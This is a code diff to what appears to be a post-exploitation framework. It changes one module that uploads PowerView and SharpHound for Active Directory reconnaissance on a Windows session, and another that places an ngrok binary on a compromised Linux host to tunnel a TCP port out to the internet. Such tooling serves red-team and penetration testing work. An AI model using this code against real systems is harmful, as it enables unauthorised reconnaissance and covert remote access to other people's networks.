@@ -4526,7 +4526,7 @@ class upload_ad_scripts(Module):
 
 		elif session.OS == 'Windows':
 			session.upload(URLS['powerview'])
-			
+
 			import tempfile
 			_, archive = url_to_bytes(URLS['sharphound'])
 			with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
@@ -4692,13 +4692,15 @@ class ngrok(Module):
 			if not session.system == 'Linux':
 				logger.error(f"This modules runs only on Linux, not on {session.system}.")
 				return False
-			session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
-			result = session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C {session.tmp} >/dev/null", value=True)
-			if not result:
-				logger.info(f"ngrok successuly extracted on {session.tmp}")
-			else:
-				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
-				return False
+
+			_, archive = url_to_bytes(URLS['ngrok_linux'])
+			with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
+				f = tf.extractfile(tf.getmember("ngrok"))
+				if f is None:
+					logger.error("File 'ngrok' not found in downloaded archive")
+					return
+				session.upload(URLS['ngrok_linux'], url_to_bytes_fn=lambda x: ('ngrok', f.read()), remote_path=session.tmp)
+
 			token = input("Authtoken: ")
 			session.exec(f"{session.tmp}/ngrok config add-authtoken {token}")
 			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
